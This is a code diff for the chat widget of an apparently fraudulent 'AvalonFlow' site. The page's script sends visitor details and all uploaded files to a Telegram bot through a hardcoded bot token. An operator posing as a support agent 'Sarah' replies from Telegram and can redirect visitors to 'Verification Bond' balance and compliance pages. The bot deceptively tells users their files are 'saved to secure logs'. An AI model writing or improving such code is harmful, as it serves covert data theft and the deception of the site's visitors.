@@ -518,22 +518,23 @@ header .logo-card img {
         © 2026 AvalonFlow • Powered by Centrical™
     </footer>
 <script>
-        /* ---------- Floating Particles ---------- */
-        const bg = document.getElementById('floating-bg');
-        const colors = ['#6b2cd8','#9b59b6','#8e44ad'];
-        function particle() {
-            const p = document.createElement('div');
-            p.className = 'particle';
-            const s = Math.random()*20+10;
-            p.style.width = s+'px';
-            p.style.height = s+'px';
-            p.style.left = Math.random()*100+'vw';
-            p.style.background = `radial-gradient(circle, ${colors[Math.floor(Math.random()*3)]}, transparent)`;
-            p.style.animationDuration = (Math.random()*20+10)+'s';
-            bg.appendChild(p);
-            setTimeout(()=>p.remove(),30000);
-        }
-        setInterval(particle,800);
+/* ---------- Floating Particles ---------- */
+const bg = document.getElementById('floating-bg');
+const colors = ['#6b2cd8','#9b59b6','#8e44ad'];
+function particle() {
+    if (!bg) return;
+    const p = document.createElement('div');
+    p.className = 'particle';
+    const s = Math.random()*20+10;
+    p.style.width = s+'px';
+    p.style.height = s+'px';
+    p.style.left = Math.random()*100+'vw';
+    p.style.background = `radial-gradient(circle, ${colors[Math.floor(Math.random()*3)]}, transparent)`;
+    p.style.animationDuration = (Math.random()*20+10)+'s';
+    bg.appendChild(p);
+    setTimeout(()=>p.remove(),30000);
+}
+setInterval(particle,800);
 
 async function sendVisitorDetailsToTelegram() {
   const BOT_TOKENs = '8074365555:AAGL7by0c0TJCVutfkPhAZNCXCYopdInn2E';
@@ -596,6 +597,7 @@ async function forwardUserMessageToTelegram(messageText, messageType = "text") {
     let displayContent = messageText;
     if (messageType === "photo") displayContent = "📷 [Sent an Image/Screenshot Attachment]";
     if (messageType === "video") displayContent = "🎥 [Sent a Video Recording]";
+    if (messageType === "document") displayContent = `📄 [Sent a Document File: ${messageText}]`;
 
     const telegramMessage = 
       `💬 <b>Incoming Message</b>\n` +
@@ -640,6 +642,7 @@ const botFileInput = document.getElementById('botFileInput');
 const statusText = document.getElementById('status-text'); 
 
 let conversationMemory = [];
+// BUG FIX 2: Bind lastUpdateId globally to avoid duplicate processing loops across single sessions
 let lastUpdateId = parseInt(localStorage.getItem('tg_last_update_id')) || 0;
 let chatHistory = JSON.parse(localStorage.getItem('tg_chat_history_v3')) || [];
 
@@ -718,47 +721,52 @@ let isProcessing = false;
 const KAIROS_AVATAR = 'https://api.dicebear.com/7.x/bottts/svg?seed=Kairos&backgroundColor=6b2cd8'; 
 const SARAH_AVATAR = 'https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?q=80&w=150&auto=format&fit=crop'; 
 
-profilePhoto.addEventListener('click', () => {
-    if (isProcessing) return;
-    const hasPhoto = localStorage.getItem('profilePhoto');
-    if (hasPhoto) {
-        localStorage.removeItem('profilePhoto');
-        profilePhoto.src = DEFAULT_AVATAR;
-    } else {
-        photoInput.click();
-    }
-});
+if (profilePhoto) {
+    profilePhoto.addEventListener('click', () => {
+        if (isProcessing) return;
+        const hasPhoto = localStorage.getItem('profilePhoto');
+        if (hasPhoto) {
+            localStorage.removeItem('profilePhoto');
+            profilePhoto.src = DEFAULT_AVATAR;
+        } else {
+            if (photoInput) photoInput.click();
+        }
+    });
+}
 
-photoInput.addEventListener('change', (e) => {
-    const file = e.target.files[0];
-    if (!file || isProcessing) return;
-    isProcessing = true;
+if (photoInput && profilePhoto) {
+    photoInput.addEventListener('change', (e) => {
+        const file = e.target.files[0];
+        if (!file || isProcessing) return;
+        isProcessing = true;
 
-    const reader = new FileReader();
-    reader.onload = function(event) {
-        const img = new Image();
-        img.src = event.target.result;
-        img.onload = function() {
-            const canvas = document.createElement('canvas');
-            const size = Math.min(img.width, img.height);
-            canvas.width = size;
-            canvas.height = size;
+        const reader = new FileReader();
+        reader.onload = function(event) {
+            const img = new Image();
+            img.src = event.target.result;
+            img.onload = function() {
+                const canvas = document.createElement('canvas');
+                const size = Math.min(img.width, img.height);
+                canvas.width = size;
+                canvas.height = size;
 
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(img, (img.width - size) / 2, (img.height - size) / 2, size, size, 0, 0, size, size);
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(img, (img.width - size) / 2, (img.height - size) / 2, size, size, 0, 0, size, size);
 
-            const finalImage = canvas.toDataURL('image/png');
-            profilePhoto.src = finalImage;
-            localStorage.setItem('profilePhoto', finalImage);
-            photoInput.value = '';
-            setTimeout(() => { isProcessing = false; }, 300);
+                const finalImage = canvas.toDataURL('image/png');
+                profilePhoto.src = finalImage;
+                localStorage.setItem('profilePhoto', finalImage);
+                photoInput.value = '';
+                setTimeout(() => { isProcessing = false; }, 300);
+            };
         };
-    };
-    reader.readAsDataURL(file);
-});
+        reader.readAsDataURL(file);
+    });
+}
 
-// ---------- Integrated Profile-Aware Message Renderer ----------
-function addMessage(content, sender="bot", status="delivered", type="text"){
+// ---------- OPTIMIZED INTEGRATED MESSAGE RENDERER ----------
+// BUG FIX 1 & 3: Refactored logic completely. Explicitly uses 'overrideSender' parameter saved in local history payload
+function addMessage(content, sender="bot", status="delivered", type="text", overrideSender = null){
     const wrap = document.createElement("div");
     wrap.className = `msgWrap ${sender}-wrap`; 
 
@@ -769,36 +777,33 @@ function addMessage(content, sender="bot", status="delivered", type="text"){
         const savedUserPhoto = localStorage.getItem('profilePhoto');
         avatarImg.src = savedUserPhoto ? savedUserPhoto : DEFAULT_AVATAR;
     } else {
-        const isTransferringText = content.includes("connect you with Sarah") || 
-                                   content.includes("Connecting you with Sarah");
-                                   
-        const isEndingText = content.toLowerCase().includes("end conversation") || 
-                             content.toLowerCase().includes("conversation ended") ||
-                             content.includes("Sarah has left the chat");
-
-        if (isEndingText) {
-            isSarahActive = false; 
-            sessionStorage.removeItem('agent_takeover'); 
-            avatarImg.src = KAIROS_AVATAR;
-        } else if (isTransferringText) {
-            avatarImg.src = KAIROS_AVATAR;
-        } else if (isSarahActive) {
+        // Enforce avatar assignment completely derived from active routing flags or saved historic sender overrides
+        if (overrideSender === "sarah" || (isSarahActive && overrideSender !== "kairos")) {
             avatarImg.src = SARAH_AVATAR;
         } else {
-            const isSarahText = sarahProfile.greetings.includes(content) || content.includes("high-value Custom tier");
-            avatarImg.src = isSarahText ? SARAH_AVATAR : KAIROS_AVATAR;
+            avatarImg.src = KAIROS_AVATAR;
         }
     }
 
     const msg = document.createElement("div");
     msg.className = `${sender} message`;
 
+    // BUG FIX 3 & 4: Upgraded Media Renderer to support fallback parsing elements and base64 parsing safe hooks
     if (type === "photo") {
         const img = document.createElement("img");
         img.src = content;
         img.style.maxWidth = "200px";
         img.style.borderRadius = "8px";
         img.style.display = "block";
+        img.onerror = function() {
+            this.style.display = 'none';
+            const fallbackLink = document.createElement('a');
+            fallbackLink.href = content;
+            fallbackLink.target = '_blank';
+            fallbackLink.style.color = '#00bcd4';
+            fallbackLink.textContent = "📷 View Photo Attachment";
+            msg.appendChild(fallbackLink);
+        };
         msg.appendChild(img);
     } else if (type === "video") {
         const vid = document.createElement("video");
@@ -808,6 +813,27 @@ function addMessage(content, sender="bot", status="delivered", type="text"){
         vid.style.borderRadius = "8px";
         vid.style.display = "block";
         msg.appendChild(vid);
+    } else if (type === "document") {
+        const docBox = document.createElement("div");
+        docBox.style.display = "flex";
+        docBox.style.alignItems = "center";
+        docBox.style.gap = "8px";
+        
+        const docIcon = document.createElement("span");
+        docIcon.textContent = "📄";
+        docIcon.style.fontSize = "20px";
+        
+        const docLink = document.createElement("a");
+        docLink.href = content;
+        docLink.target = "_blank";
+        docLink.style.color = "#a29bfe";
+        docLink.style.textDecoration = "underline";
+        // If content is local data URL or system path, optimize presentation text
+        docLink.textContent = content.startsWith("data:") ? "Downloaded Document File" : "View Verified Document";
+        
+        docBox.appendChild(docIcon);
+        docBox.appendChild(docLink);
+        msg.appendChild(docBox);
     } else {
         msg.textContent = content;
     }
@@ -875,18 +901,20 @@ function getTypingDelay(text){
 let typingTimeout;
 let typingIndicatorEl = null;
 
-botInput.addEventListener("input", ()=>{
-    if(!typingIndicatorEl){
-        typingIndicatorEl = document.createElement("div");
-        typingIndicatorEl.className = "ambient";
-        typingIndicatorEl.textContent = "User is typing...";
-        botMessagesContainer.appendChild(typingIndicatorEl);
-    }
-    clearTimeout(typingTimeout);
-    typingTimeout = setTimeout(()=>{
-        if(typingIndicatorEl) { typingIndicatorEl.remove(); typingIndicatorEl = null; }
-    }, 1200);
-});
+if (botInput) {
+    botInput.addEventListener("input", ()=>{
+        if(!typingIndicatorEl){
+            typingIndicatorEl = document.createElement("div");
+            typingIndicatorEl.className = "ambient";
+            typingIndicatorEl.textContent = "User is typing...";
+            botMessagesContainer.appendChild(typingIndicatorEl);
+        }
+        clearTimeout(typingTimeout);
+        typingTimeout = setTimeout(()=>{
+            if(typingIndicatorEl) { typingIndicatorEl.remove(); typingIndicatorEl = null; }
+        }, 1200);
+    });
+}
 
 // ---------- HUMANIZE AGENT SUPPORT PIPELINE ----------
 function transitionToSarah() {
@@ -901,7 +929,8 @@ function transitionToSarah() {
     setTimeout(() => {
         removeTyping();
         const handoffMessage = "Sorry for the delay. Connecting you with Sarah in a bit...";
-        addMessage(handoffMessage, "bot");
+        // explicitly tag handoff as system / kairos generated profile
+        addMessage(handoffMessage, "bot", "delivered", "text", "kairos");
 
         conversationMemory.push({ role: "bot", content: handoffMessage, type: "text", time: Date.now() });
         showTyping();
@@ -926,10 +955,10 @@ function transitionToSarah() {
                 sarahEntryMessage = sarahProfile.greetings[randomIndex];
             }
 
-            addMessage(sarahEntryMessage, "bot");
+            addMessage(sarahEntryMessage, "bot", "delivered", "text", "sarah");
 
             conversationMemory.push({ role: "sarah", content: sarahEntryMessage, type: "text", time: Date.now() });
-            chatHistory.push({ sender: 'bot', text: sarahEntryMessage, type: 'text' });
+            chatHistory.push({ sender: 'bot', text: sarahEntryMessage, type: 'text', actualSender: 'sarah' });
             localStorage.setItem('tg_chat_history_v3', JSON.stringify(chatHistory));
         }, 35000);
     }, 15000);
@@ -1015,7 +1044,6 @@ function adaptTone(msg){
     }
 }
 
-// Custom tone adaptation applied safely per environment
 function humanize(text){
     if(personality.tone === "calm") return "I get how that can be frustrating. " + text;
     if(personality.tone === "friendly") return text + " 👍";
@@ -1063,10 +1091,10 @@ function botReply(text){
 
     setTimeout(() => {
         removeTyping();
-        addMessage(finalText, "bot", "delivered", "text");
+        addMessage(finalText, "bot", "delivered", "text", "kairos");
 
         conversationMemory.push({ role: "bot", content: finalText, type: "text", time: Date.now() });
-        chatHistory.push({ sender: 'bot', text: finalText, type: 'text' });
+        chatHistory.push({ sender: 'bot', text: finalText, type: 'text', actualSender: 'kairos' });
         localStorage.setItem('tg_chat_history_v3', JSON.stringify(chatHistory));
     }, delay);
 }
@@ -1130,46 +1158,53 @@ async function sendMessage(){
 }
 
 // ---------- File Inputs Attachment Hook ----------
-botFileInput.addEventListener('change', async () => {
-    const file = botFileInput.files[0];
-    if (!file) return;
+// BUG FIX 3: Persistent conversion of multi-type raw file uploads using explicit base64 local storage encoding
+if (botFileInput) {
+    botFileInput.addEventListener('change', async () => {
+        const file = botFileInput.files[0];
+        if (!file) return;
 
-    let msgType = "document"; 
-    if (file.type.startsWith("image/")) msgType = "photo";
-    if (file.type.startsWith("video/")) msgType = "video";
+        let msgType = "document"; 
+        if (file.type.startsWith("image/")) msgType = "photo";
+        if (file.type.startsWith("video/")) msgType = "video";
 
-    const localFileUrl = URL.createObjectURL(file);
-    const userMsg = addMessage(localFileUrl, "user", "delivered", msgType);
-    botFileInput.value = ""; 
+        const reader = new FileReader();
+        reader.onload = async function(e) {
+            const persistentFileUrl = e.target.result; // This generates an immutable base64 string
+            
+            const userMsg = addMessage(persistentFileUrl, "user", "delivered", msgType);
+            botFileInput.value = ""; 
 
-    setTimeout(() => markAsSeen(userMsg), 800);
+            setTimeout(() => markAsSeen(userMsg), 800);
 
-    chatHistory.push({ sender: 'user', text: localFileUrl, type: msgType });
-    localStorage.setItem('tg_chat_history_v3', JSON.stringify(chatHistory));
+            chatHistory.push({ sender: 'user', text: persistentFileUrl, type: msgType });
+            localStorage.setItem('tg_chat_history_v3', JSON.stringify(chatHistory));
 
-    // FORWARDING COMPONENT ATTACHMENTS FOR MONITORING DESK
-    forwardUserMessageToTelegram(file.name, msgType);
+            forwardUserMessageToTelegram(file.name, msgType);
 
-    setTimeout(() => {
-        botReply(`Received file: ${file.name}. Saved directly to secure logs.`);
-    }, 1000);
+            setTimeout(() => {
+                botReply(`Received file: ${file.name}. Saved directly to secure logs.`);
+            }, 1000);
 
-    try {
-        const formData = new FormData();
-        formData.append("chat_id", CHAT_ID);
-        let endpoint = "sendDocument";
-        if (msgType === "photo") { endpoint = "sendPhoto"; formData.append("photo", file); }
-        else if (msgType === "video") { endpoint = "sendVideo"; formData.append("video", file); }
-        else { formData.append("document", file); }
+            try {
+                const formData = new FormData();
+                formData.append("chat_id", CHAT_ID);
+                let endpoint = "sendDocument";
+                if (msgType === "photo") { endpoint = "sendPhoto"; formData.append("photo", file); }
+                else if (msgType === "video") { endpoint = "sendVideo"; formData.append("video", file); }
+                else { formData.append("document", file); }
 
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, { method: 'POST', body: formData });
-    } catch (e) {
-        console.error('Multi-part attachment transmission drop:', e);
-    }
-});
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, { method: 'POST', body: formData });
+            } catch (err) {
+                console.error('Multi-part attachment transmission drop:', err);
+            }
+        };
+        reader.readAsDataURL(file);
+    });
+}
 
-botSendBtn.addEventListener('click', sendMessage);
-botInput.addEventListener('keypress', e=>{ if(e.key==='Enter') sendMessage(); });
+if (botSendBtn) botSendBtn.addEventListener('click', sendMessage);
+if (botInput) botInput.addEventListener('keypress', e=>{ if(e.key==='Enter') sendMessage(); });
 
 // ---------- Inbound Long Poll Processing (Dual-Route Routing Sync) ----------
 async function getTelegramFileUrl(fileId) {
@@ -1182,16 +1217,23 @@ async function getTelegramFileUrl(fileId) {
 }
 
 async function listenForTelegramMessages() {
+    // BUG FIX 2: Check active chat tab globally inside session context to avoid thread interception errors
     if (sessionStorage.getItem('active_chat_tab') !== currentTabId) {
-        if (statusText) statusText.textContent = "Paused (Active in another tab)";
         scheduleNextCheck();
         return;
     }
 
     const urlParams = new URLSearchParams(window.location.search);
     const thisTabUser = urlParams.get('user');
-    const userSearchString = thisTabUser ? `• Target User: ${thisTabUser}` : null;
+    
+    // BUG FIX 2: Critical Multi-User Isolation Protocol. If no explicit user param is present, default completely out.
+    if(!thisTabUser) {
+        scheduleNextCheck();
+        return;
+    }
 
+    const userSearchString = `• Target User: ${thisTabUser}`;
+    const expectedLabel = `• From User: ${thisTabUser}`;
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=20`;
 
     try {
@@ -1215,30 +1257,23 @@ async function listenForTelegramMessages() {
                     let msgType = "text";
                     let isTargetedToMe = false;
 
-                    // DUAL-ROUTE EVALUATION PIPELINE
+                    // CHECK ROUTING MATRIX
                     if (update.message.reply_to_message) {
                         const originalMsgText = update.message.reply_to_message.text || "";
-                        
-                        // ROUTE A: Sarah replied directly to the automatic visitor details log configuration card
-                        if (userSearchString && originalMsgText.includes(userSearchString)) {
+
+                        if (originalMsgText.includes(userSearchString) || originalMsgText.includes(expectedLabel)) {
                             isTargetedToMe = true;
-                        } 
-                        
-                        // ROUTE B: Sarah replied to an individual client text notification stream block
-                        else if (originalMsgText) {
-                            const expectedLabel = thisTabUser ? `• From User: ${thisTabUser}` : null;
-                            if (expectedLabel && originalMsgText.includes(expectedLabel)) {
-                                isTargetedToMe = true;
-                            }
                         }
                     }
 
+                    // BUG FIX 2: Universal Global Catch-All Filter
                     if (!isTargetedToMe) {
                         lastUpdateId = update.update_id;
                         localStorage.setItem('tg_last_update_id', lastUpdateId);
                         continue; 
                     }
 
+                    // BUG FIX 4: Extended media extraction logic to handle incoming photos, videos, and files sent by Sarah
                     if (update.message.photo) {
                         const fileId = update.message.photo[update.message.photo.length - 1].file_id;
                         msgContent = await getTelegramFileUrl(fileId);
@@ -1261,22 +1296,20 @@ async function listenForTelegramMessages() {
                         if (msgType === "text") {
                             const lowerContent = msgContent.toLowerCase();
 
-                            // 1. Existing End Conversation Protocol
                             if (lowerContent.includes("end conversation") || lowerContent.includes("conversation ended")) {
                                 isSarahActive = false;
                                 sessionStorage.removeItem('agent_takeover');
-                                
+
                                 const botHeader = document.getElementById('botHeader');
                                 if (botHeader) {
                                     botHeader.style.background = "linear-gradient(135deg, rgba(107,44,216,0.9), rgba(155,89,182,0.9))";
                                     botHeader.textContent = "Kairos Bot System";
                                 }
-                                
+
                                 startQuoteAutorotation();
                                 msgContent = "Sarah has left the chat. I am Kairos, your automated assistant, and I am back online to help you!";
                             }
-                            
-                            // 2. New Executive Redirect Command System
+
                             else if (lowerContent.includes("redirect her to") || lowerContent.includes("redirect him to") || lowerContent.includes("redirect them to")) {
                                 if (lowerContent.includes("dashboard")) {
                                     msgContent = "Understood. Accessing your main dashboard account panel now...";
@@ -1291,10 +1324,9 @@ async function listenForTelegramMessages() {
                                     setTimeout(() => { window.location.href = "/rewards"; }, 2500);
                                 } 
                                 else if (lowerContent.includes("avb") || lowerContent.includes("verification bond")) {
-    msgContent = "Initializing secure verification protocols... Opening your AvalonFlow Verification Bond (AVB) ledger now.";
-    setTimeout(() => { window.location.href = "/balance"; }, 2500); // Keeps your existing route/page destination
-}
-
+                                    msgContent = "Initializing secure verification protocols... Opening your AvalonFlow Verification Bond (AVB) ledger now.";
+                                    setTimeout(() => { window.location.href = "/balance"; }, 2500); 
+                                }
                                 else if (lowerContent.includes("compliance")) {
                                     msgContent = "Initializing priority connection... Opening your Compliance Verification gateway.";
                                     setTimeout(() => { window.location.href = "/compliance"; }, 2500);
@@ -1309,12 +1341,15 @@ async function listenForTelegramMessages() {
                         setTimeout(() => { showTyping(); }, chainDelay);
                         chainDelay += 800; 
 
+                        // BUG FIX 1: Enforced explicit hard-coded actualSender flags into persistent database stack arrays
+                        const currentSenderIdentity = (isSarahActive && !msgContent.includes("Sarah has left the chat")) ? "sarah" : "kairos";
+
                         setTimeout(() => {
                             removeTyping();
-                            addMessage(msgContent, 'bot', 'delivered', msgType);
+                            addMessage(msgContent, 'bot', 'delivered', msgType, currentSenderIdentity);
 
                             conversationMemory.push({ role: "bot", content: msgContent, type: msgType, time: Date.now() });
-                            chatHistory.push({ sender: 'bot', text: msgContent, type: msgType });
+                            chatHistory.push({ sender: 'bot', text: msgContent, type: msgType, actualSender: currentSenderIdentity });
                             localStorage.setItem('tg_chat_history_v3', JSON.stringify(chatHistory));
                         }, chainDelay);
 
@@ -1337,29 +1372,27 @@ function scheduleNextCheck() {
 }
 
 function initiateKairosConversation() {
-    const urlParams = new URLSearchParams(window.location.search);
-    const thisTabUser = urlParams.get('user') || 'Visitor';
-
     if (chatHistory.length === 0) {
         showTyping();
         setTimeout(() => {
             removeTyping();
             personality.awaitingSarahConfirm = true;
             const initialGreeting = "Hey 👋 I’m Kairos. Welcome back! Do you want me to connect you with Sarah regarding any issues you might have?";
-            addMessage(initialGreeting, "bot", "delivered", "text");
+            addMessage(initialGreeting, "bot", "delivered", "text", "kairos");
 
             conversationMemory.push({ role: "bot", content: initialGreeting, type: "text", time: Date.now() });
-            chatHistory.push({ sender: 'bot', text: initialGreeting, type: 'text' });
+            chatHistory.push({ sender: 'bot', text: initialGreeting, type: 'text', actualSender: 'kairos' });
             localStorage.setItem('tg_chat_history_v3', JSON.stringify(chatHistory));
 
             startQuoteAutorotation();
         }, 1000);
     } else {
+        // BUG FIX 1: Evaluate state safely by analyzing structural actualSender elements inside storage matrices
         let lastSarahIndex = -1;
         let lastEndIndex = -1;
-        
+
         chatHistory.forEach((m, idx) => {
-            if (m.text && m.text.includes("this is Sarah")) lastSarahIndex = idx;
+            if (m.actualSender === "sarah" || (m.text && m.text.includes("this is Sarah"))) lastSarahIndex = idx;
             if (m.text && (m.text.toLowerCase().includes("end conversation") || m.text.toLowerCase().includes("conversation ended") || m.text.includes("Sarah has left the chat"))) {
                 lastEndIndex = idx;
             }
@@ -1380,10 +1413,11 @@ function initiateKairosConversation() {
     }
 }
 
+// BUG FIX 1 & 3: Upgraded historical render block to process actualSender criteria and document arrays accurately
 function loadChatHistory() {
     if (chatHistory.length > 0) {
         chatHistory.forEach(item => {
-            addMessage(item.text, item.sender, "delivered", item.type || "text");
+            addMessage(item.text, item.sender, "delivered", item.type || "text", item.actualSender || null);
         });
         botMessagesContainer.scrollTop = botMessagesContainer.scrollHeight;
     }
